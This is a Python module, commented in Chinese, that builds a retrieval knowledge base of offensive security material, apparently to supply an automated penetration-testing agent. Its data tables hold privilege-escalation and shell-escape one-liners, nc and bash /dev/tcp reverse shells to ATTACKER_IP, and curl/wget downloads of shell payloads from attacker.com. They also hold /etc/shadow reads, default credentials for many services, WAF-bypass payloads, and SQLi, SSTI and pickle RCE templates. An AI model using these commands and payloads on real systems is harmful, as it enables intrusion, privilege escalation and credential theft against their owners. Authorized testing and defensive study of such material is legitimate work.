#!/usr/bin/env python3
"""
Knowledge Base RAG — 安全知识库检索增强生成
移植自 RedAmon 框架的 Knowledge Base RAG 系统

内置知识库：
1. GTFOBins — Linux 提权/逃逸技巧
2. LOLBAS — Windows Living Off The Land
3. OWASP WSTG — Web 安全测试指南
4. 常见默认凭据
5. WAF 绕过技巧
6. 漏洞利用模式库

用法：
    from knowledge_rag import SecurityKnowledgeBase
    
    kb = SecurityKnowledgeBase()
    
    # 查询提权方法
    results = kb.query("sudo privilege escalation python")
    
    # 查询 WAF 绕过
    results = kb.query("cloudflare SQL injection bypass")
    
    # 查询默认密码
    creds = kb.get_default_credentials("tomcat")
"""

import json
import os
import re
import math
from collections import Counter
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional, Set, Tuple


# ═══════════════════════════════════════════════════════════════
# 数据结构
# ═══════════════════════════════════════════════════════════════

@dataclass
class KnowledgeEntry:
    """知识条目"""
    id: str = ""
    title: str = ""
    content: str = ""
    category: str = ""  # gtfobins/lolbas/owasp/credentials/waf_bypass/exploit_patterns
    tags: List[str] = field(default_factory=list)
    relevance_score: float = 0.0
    source: str = ""


@dataclass 
class QueryResult:
    """查询结果"""
    query: str = ""
    entries: List[KnowledgeEntry] = field(default_factory=list)
    total_matches: int = 0
    suggestion: str = ""


# ═══════════════════════════════════════════════════════════════
# 内置知识库数据
# ═══════════════════════════════════════════════════════════════

# GTFOBins — Linux 提权/文件读写/Shell 逃逸
GTFOBINS_DATA = [
    {"binary": "python", "functions": ["shell", "file_read", "file_write", "suid", "sudo"],
     "shell": "python -c 'import os; os.system(\"/bin/sh\")'",
     "sudo": "sudo python -c 'import os; os.system(\"/bin/sh\")'",
     "suid": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
     "file_read": "python -c 'print(open(\"/etc/shadow\").read())'"},
    {"binary": "python3", "functions": ["shell", "file_read", "sudo", "suid"],
     "shell": "python3 -c 'import os; os.system(\"/bin/sh\")'",
     "sudo": "sudo python3 -c 'import os; os.system(\"/bin/sh\")'"},
    {"binary": "vim", "functions": ["shell", "file_read", "file_write", "sudo"],
     "shell": "vim -c ':!/bin/sh'",
     "sudo": "sudo vim -c ':!/bin/sh'"},
    {"binary": "find", "functions": ["shell", "suid", "sudo"],
     "shell": "find . -exec /bin/sh \\; -quit",
     "sudo": "sudo find . -exec /bin/sh \\; -quit"},
    {"binary": "nmap", "functions": ["shell", "sudo"],
     "shell": "nmap --interactive\n!sh",
     "sudo": "sudo nmap --interactive\n!sh"},
    {"binary": "awk", "functions": ["shell", "file_read", "sudo"],
     "shell": "awk 'BEGIN {system(\"/bin/sh\")}'",
     "sudo": "sudo awk 'BEGIN {system(\"/bin/sh\")}'"},
    {"binary": "perl", "functions": ["shell", "sudo", "suid"],
     "shell": "perl -e 'exec \"/bin/sh\";'",
     "sudo": "sudo perl -e 'exec \"/bin/sh\";'"},
    {"binary": "ruby", "functions": ["shell", "sudo"],
     "shell": "ruby -e 'exec \"/bin/sh\"'",
     "sudo": "sudo ruby -e 'exec \"/bin/sh\"'"},
    {"binary": "less", "functions": ["shell", "file_read", "sudo"],
     "shell": "less /etc/passwd\n!/bin/sh",
     "sudo": "sudo less /etc/passwd\n!/bin/sh"},
    {"binary": "tar", "functions": ["shell", "sudo"],
     "sudo": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"},
    {"binary": "zip", "functions": ["shell", "sudo"],
     "sudo": "sudo zip /tmp/x.zip /etc/passwd -T --unzip-command=\"sh -c /bin/sh\""},
    {"binary": "git", "functions": ["shell", "sudo"],
     "shell": "git help config\n!/bin/sh",
     "sudo": "sudo git -p help config\n!/bin/sh"},
    {"binary": "docker", "functions": ["shell", "sudo"],
     "shell": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"},
    {"binary": "env", "functions": ["shell", "sudo", "suid"],
     "shell": "env /bin/sh",
     "sudo": "sudo env /bin/sh"},
    {"binary": "curl", "functions": ["file_read", "file_write"],
     "file_read": "curl file:///etc/shadow",
     "file_write": "curl http://attacker.com/shell.sh -o /tmp/shell.sh"},
    {"binary": "wget", "functions": ["file_write"],
     "file_write": "wget http://attacker.com/shell -O /tmp/shell"},
    {"binary": "nc", "functions": ["reverse_shell"],
     "reverse_shell": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f"},
    {"binary": "bash", "functions": ["reverse_shell", "suid"],
     "reverse_shell": "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
     "suid": "bash -p"},
]

# 常见默认凭据
DEFAULT_CREDENTIALS = {
    "tomcat": [("tomcat", "tomcat"), ("admin", "admin"), ("manager", "manager"), ("admin", "s3cret")],
    "jenkins": [("admin", "admin"), ("jenkins", "jenkins")],
    "wordpress": [("admin", "admin"), ("admin", "password")],
    "phpmyadmin": [("root", ""), ("root", "root"), ("root", "password")],
    "mysql": [("root", ""), ("root", "root"), ("root", "mysql"), ("root", "toor")],
    "postgres": [("postgres", "postgres"), ("postgres", "password")],
    "mongodb": [("admin", "admin"), ("root", "root")],
    "redis": [("", ""), ("default", "")],
    "ssh": [("root", "toor"), ("admin", "admin"), ("ubuntu", "ubuntu")],
    "ftp": [("anonymous", ""), ("ftp", "ftp"), ("admin", "admin")],
    "vnc": [("", "password"), ("", "1234")],
    "mssql": [("sa", ""), ("sa", "sa"), ("sa", "Password123")],
    "oracle": [("system", "oracle"), ("sys", "change_on_install")],
    "router": [("admin", "admin"), ("admin", "password"), ("admin", "1234")],
    "spring_boot": [("user", "password"), ("admin", "admin")],
    "grafana": [("admin", "admin")],
    "elasticsearch": [("elastic", "changeme")],
    "rabbitmq": [("guest", "guest")],
    "activemq": [("admin", "admin")],
}

# WAF 绕过技巧
WAF_BYPASS_TECHNIQUES = {
    "cloudflare": [
        {"technique": "Unicode normalization", "payload": "sele\\u0063t", "context": "SQLi"},
        {"technique": "Double URL encode", "payload": "%2527%2520OR%25201%253D1", "context": "SQLi"},
        {"technique": "Chunked transfer", "payload": "Transfer-Encoding: chunked", "context": "All"},
        {"technique": "HTTP/2 header", "payload": "利用 HTTP/2 伪头注入", "context": "Header injection"},
    ],
    "aliyun_waf": [
        {"technique": "MySQL 注释", "payload": "/*!50000SELECT*/", "context": "SQLi"},
        {"technique": "换行绕过", "payload": "sel%0aect", "context": "SQLi"},
        {"technique": "参数污染", "payload": "id=1&id=2' union select", "context": "SQLi"},
    ],
    "modsecurity": [
        {"technique": "大小写混合", "payload": "SeLeCt", "context": "SQLi"},
        {"technique": "注释分割", "payload": "sel/**/ect", "context": "SQLi"},
        {"technique": "编码变体", "payload": "0x73656c656374 (hex)", "context": "SQLi"},
    ],
    "generic": [
        {"technique": "双重编码", "payload": "%252f%252e%252e%252f", "context": "Path traversal"},
        {"technique": "Null byte", "payload": "%00", "context": "Extension bypass"},
        {"technique": "IP 混淆", "payload": "0x7f000001 / 2130706433 / 127.1", "context": "SSRF"},
        {"technique": "大小写绕过", "payload": "<ScRiPt>alert(1)</ScRiPt>", "context": "XSS"},
        {"technique": "HTML 实体", "payload": "&#x3c;script&#x3e;", "context": "XSS"},
        {"technique": "SVG 载体", "payload": "<svg onload=alert(1)>", "context": "XSS"},
    ],
}

# OWASP 测试清单（精简版）
OWASP_WSTG_CHECKLIST = [
    {"id": "INFO-01", "name": "搜索引擎信息收集", "category": "Information Gathering"},
    {"id": "INFO-02", "name": "Web 服务器指纹", "category": "Information Gathering"},
    {"id": "INFO-04", "name": "应用入口点枚举", "category": "Information Gathering"},
    {"id": "CONF-02", "name": "测试应用平台配置", "category": "Configuration"},
    {"id": "CONF-05", "name": "枚举基础设施和应用管理接口", "category": "Configuration"},
    {"id": "IDNT-01", "name": "测试角色定义", "category": "Identity Management"},
    {"id": "IDNT-04", "name": "测试账户枚举", "category": "Identity Management"},
    {"id": "ATHN-01", "name": "测试加密传输凭据", "category": "Authentication"},
    {"id": "ATHN-02", "name": "测试默认凭据", "category": "Authentication"},
    {"id": "ATHN-03", "name": "测试弱锁定机制", "category": "Authentication"},
    {"id": "ATHZ-01", "name": "测试目录遍历/文件包含", "category": "Authorization"},
    {"id": "ATHZ-02", "name": "测试绕过授权模式", "category": "Authorization"},
    {"id": "ATHZ-03", "name": "测试权限提升", "category": "Authorization"},
    {"id": "ATHZ-04", "name": "测试不安全的直接对象引用", "category": "Authorization"},
    {"id": "SESS-01", "name": "测试会话管理模式", "category": "Session Management"},
    {"id": "SESS-02", "name": "测试 Cookie 属性", "category": "Session Management"},
    {"id": "INPV-01", "name": "测试反射型 XSS", "category": "Input Validation"},
    {"id": "INPV-02", "name": "测试存储型 XSS", "category": "Input Validation"},
    {"id": "INPV-05", "name": "测试 SQL 注入", "category": "Input Validation"},
    {"id": "INPV-12", "name": "测试命令注入", "category": "Input Validation"},
    {"id": "INPV-13", "name": "测试格式化字符串注入", "category": "Input Validation"},
    {"id": "INPV-18", "name": "测试服务端请求伪造", "category": "Input Validation"},
    {"id": "BUSL-01", "name": "测试业务逻辑数据验证", "category": "Business Logic"},
    {"id": "BUSL-07", "name": "测试对应用误用的防御", "category": "Business Logic"},
    {"id": "CLNT-01", "name": "测试基于 DOM 的 XSS", "category": "Client-side"},
    {"id": "CLNT-07", "name": "测试跨域资源共享", "category": "Client-side"},
    {"id": "APIT-01", "name": "测试 GraphQL", "category": "API Testing"},
]

# 漏洞利用模式
EXPLOIT_PATTERNS = {
    "blind_sqli_boolean": {
        "description": "布尔盲注模式",
        "template": "' AND (SELECT SUBSTRING({column},1,1) FROM {table} LIMIT 1)='{char}'--",
        "automation": "逐字符提取，二分法加速",
    },
    "blind_sqli_time": {
        "description": "时间盲注模式",
        "template": "' AND IF(SUBSTRING({column},1,1)='{char}', SLEEP(3), 0)--",
        "automation": "每字符一次延迟确认",
    },
    "union_sqli": {
        "description": "UNION 注入模式",
        "template": "' UNION SELECT {nulls},GROUP_CONCAT({column}),{nulls} FROM {table}--",
        "steps": ["1.确定列数(ORDER BY)", "2.找回显位", "3.提取数据"],
    },
    "ssti_jinja2": {
        "description": "Jinja2 SSTI RCE",
        "template": "{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}",
    },
    "ssti_twig": {
        "description": "Twig SSTI RCE",
        "template": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('{cmd}')}}",
    },
    "deserialization_python_pickle": {
        "description": "Python Pickle RCE",
        "template": "import pickle,os;pickle.loads(b\"cos\\nsystem\\n(S'{cmd}'\\ntR.\")",
    },
    "jwt_none_algorithm": {
        "description": "JWT None 算法攻击",
        "steps": ["1.解码JWT", "2.修改alg为none", "3.修改payload", "4.去掉签名"],
    },
    "path_traversal_linux": {
        "description": "Linux 路径遍历",
        "payloads": ["../../../../etc/passwd", "....//....//etc/passwd", "..%252f..%252fetc/passwd"],
    },
}


# ═══════════════════════════════════════════════════════════════
# TF-IDF 简易搜索引擎（无外部依赖）
# ═══════════════════════════════════════════════════════════════

class SimpleSearchEngine:
    """轻量级 TF-IDF 搜索（替代 FAISS，零依赖）"""

    def __init__(self):
        self._documents: List[Dict] = []
        self._index: Dict[str, Set[int]] = {}  # 倒排索引
        self._doc_freqs: Counter = Counter()
        self._total_docs = 0

    def add_document(self, doc_id: str, text: str, metadata: Dict = None):
        """添加文档"""
        idx = len(self._documents)
        self._documents.append({"id": doc_id, "text": text, "metadata": metadata or {}})

        # 更新倒排索引
        tokens = self._tokenize(text)
        unique_tokens = set(tokens)
        for token in unique_tokens:
            self._index.setdefault(token, set()).add(idx)
            self._doc_freqs[token] += 1

        self._total_docs += 1

    def search(self, query: str, top_k: int = 5) -> List[Tuple[float, Dict]]:
        """TF-IDF 搜索"""
        query_tokens = self._tokenize(query)
        if not query_tokens:
            return []

        # 计算每个文档的得分
        scores: Dict[int, float] = {}
        for token in query_tokens:
            if token not in self._index:
                continue
            # IDF
            idf = math.log(self._total_docs / (self._doc_freqs[token] + 1)) + 1
            for doc_idx in self._index[token]:
                # TF（简化：出现即计 1）
                scores[doc_idx] = scores.get(doc_idx, 0) + idf

        # 排序
        ranked = sorted(scores.items(), key=lambda x: x[1], reverse=True)
        results = []
        for doc_idx, score in ranked[:top_k]:
            doc = self._documents[doc_idx]
            results.append((score, doc))

        return results

    def _tokenize(self, text: str) -> List[str]:
        """简易分词"""
        text = text.lower()
        # 英文分词 + 中文单字
        tokens = re.findall(r'[a-z0-9_]+|[\u4e00-\u9fff]', text)
        return [t for t in tokens if len(t) > 1 or '\u4e00' <= t <= '\u9fff']


# ═══════════════════════════════════════════════════════════════
# Security Knowledge Base 主类
# ═══════════════════════════════════════════════════════════════

class SecurityKnowledgeBase:
    """
    安全知识库 — RAG 检索增强
    
    内置 6 大知识库，支持关键词检索和语义匹配。
    """

    def __init__(self):
        self._engine = SimpleSearchEngine()
        self._loaded = False

    def _ensure_loaded(self):
        """延迟加载知识库"""
        if self._loaded:
            return
        self._load_gtfobins()
        self._load_credentials()
        self._load_waf_bypass()
        self._load_owasp()
        self._load_exploit_patterns()
        self._loaded = True

    def query(self, query: str, top_k: int = 5, category: str = "") -> QueryResult:
        """
        查询知识库
        
        Args:
            query: 查询文本
            top_k: 返回条数
            category: 限制类别（可选）
        """
        self._ensure_loaded()
        raw_results = self._engine.search(query, top_k=top_k * 2)

        entries = []
        for score, doc in raw_results:
            meta = doc.get("metadata", {})
            if category and meta.get("category") != category:
                continue
            entries.append(KnowledgeEntry(
                id=doc["id"],
                title=meta.get("title", ""),
                content=doc["text"][:500],
                category=meta.get("category", ""),
                tags=meta.get("tags", []),
                relevance_score=score,
                source=meta.get("source", ""),
            ))
            if len(entries) >= top_k:
                break

        return QueryResult(query=query, entries=entries, total_matches=len(entries))

    def get_default_credentials(self, service: str) -> List[Tuple[str, str]]:
        """获取服务的默认凭据"""
        service_lower = service.lower()
        # 精确匹配
        if service_lower in DEFAULT_CREDENTIALS:
            return DEFAULT_CREDENTIALS[service_lower]
        # 模糊匹配
        for key, creds in DEFAULT_CREDENTIALS.items():
            if service_lower in key or key in service_lower:
                return creds
        return []

    def get_gtfobins(self, binary: str, function: str = "") -> List[Dict]:
        """获取 GTFOBins 利用方式"""
        results = []
        binary_lower = binary.lower()
        for entry in GTFOBINS_DATA:
            if entry["binary"] == binary_lower:
                if function:
                    if function in entry.get("functions", []):
                        results.append({"binary": entry["binary"], "method": entry.get(function, "")})
                else:
                    results.append(entry)
        return results

    def get_waf_bypass(self, waf_type: str = "generic", context: str = "") -> List[Dict]:
        """获取 WAF 绕过技巧"""
        techniques = WAF_BYPASS_TECHNIQUES.get(waf_type.lower(), [])
        if not techniques:
            techniques = WAF_BYPASS_TECHNIQUES.get("generic", [])

        if context:
            context_lower = context.lower()
            techniques = [t for t in techniques if context_lower in t.get("context", "").lower()]

        return techniques

    def get_exploit_pattern(self, pattern_name: str) -> Optional[Dict]:
        """获取漏洞利用模式"""
        return EXPLOIT_PATTERNS.get(pattern_name)

    def get_owasp_checklist(self, category: str = "") -> List[Dict]:
        """获取 OWASP 测试清单"""
        if category:
            return [item for item in OWASP_WSTG_CHECKLIST if category.lower() in item["category"].lower()]
        return OWASP_WSTG_CHECKLIST

    def tradecraft_lookup(self, question: str) -> str:
        """
        Tradecraft 查询（自然语言问答）
        返回最相关的知识库内容作为上下文
        """
        self._ensure_loaded()
        results = self._engine.search(question, top_k=3)
        if not results:
            return "未找到相关知识。"

        context_parts = []
        for score, doc in results:
            meta = doc.get("metadata", {})
            context_parts.append(f"[{meta.get('category', '')}] {meta.get('title', '')}\n{doc['text'][:300]}")

        return "\n---\n".join(context_parts)

    # ─── 数据加载 ──────────────────────────────────────────

    def _load_gtfobins(self):
        for entry in GTFOBINS_DATA:
            binary = entry["binary"]
            functions = entry.get("functions", [])
            text_parts = [f"GTFOBins: {binary}", f"Functions: {', '.join(functions)}"]
            for func in functions:
                if func in entry:
                    text_parts.append(f"{func}: {entry[func]}")
            text = "\n".join(text_parts)
            self._engine.add_document(
                f"gtfo_{binary}", text,
                {"category": "gtfobins", "title": f"{binary} privilege escalation", "tags": functions, "source": "GTFOBins"}
            )

    def _load_credentials(self):
        for service, creds in DEFAULT_CREDENTIALS.items():
            cred_text = f"Default credentials for {service}:\n"
            cred_text += "\n".join([f"  {u}:{p}" for u, p in creds])
            self._engine.add_document(
                f"cred_{service}", cred_text,
                {"category": "credentials", "title": f"{service} default passwords", "tags": [service, "password", "default"], "source": "DefaultCreds"}
            )

    def _load_waf_bypass(self):
        for waf, techniques in WAF_BYPASS_TECHNIQUES.items():
            for i, tech in enumerate(techniques):
                text = f"WAF Bypass ({waf}): {tech['technique']}\nPayload: {tech['payload']}\nContext: {tech['context']}"
                self._engine.add_document(
                    f"waf_{waf}_{i}", text,
                    {"category": "waf_bypass", "title": f"{waf} bypass: {tech['technique']}", "tags": [waf, tech["context"].lower()], "source": "WAF Bypass DB"}
                )

    def _load_owasp(self):
        for item in OWASP_WSTG_CHECKLIST:
            text = f"OWASP {item['id']}: {item['name']} ({item['category']})"
            self._engine.add_document(
                f"owasp_{item['id']}", text,
                {"category": "owasp", "title": item["name"], "tags": [item["category"].lower()], "source": "OWASP WSTG"}
            )

    def _load_exploit_patterns(self):
        for name, pattern in EXPLOIT_PATTERNS.items():
            text = f"Exploit Pattern: {name}\n{pattern.get('description', '')}\n"
            if "template" in pattern:
                text += f"Template: {pattern['template']}\n"
            if "steps" in pattern:
                text += "Steps: " + ", ".join(pattern["steps"])
            if "payloads" in pattern:
                text += "Payloads: " + ", ".join(pattern["payloads"][:3])
            self._engine.add_document(
                f"exploit_{name}", text,
                {"category": "exploit_patterns", "title": pattern.get("description", name), "tags": [name], "source": "Exploit Patterns"}
            )


# ═══════════════════════════════════════════════════════════════
# 便捷接口
# ═══════════════════════════════════════════════════════════════

# 全局单例
_kb_instance: Optional[SecurityKnowledgeBase] = None

def get_knowledge_base() -> SecurityKnowledgeBase:
    """获取全局知识库实例"""
    global _kb_instance
    if _kb_instance is None:
        _kb_instance = SecurityKnowledgeBase()
    return _kb_instance

def kb_query(query: str, top_k: int = 5) -> List[Dict]:
    """快捷查询"""
    kb = get_knowledge_base()
    result = kb.query(query, top_k)
    return [{"title": e.title, "content": e.content, "category": e.category, "score": e.relevance_score} for e in result.entries]
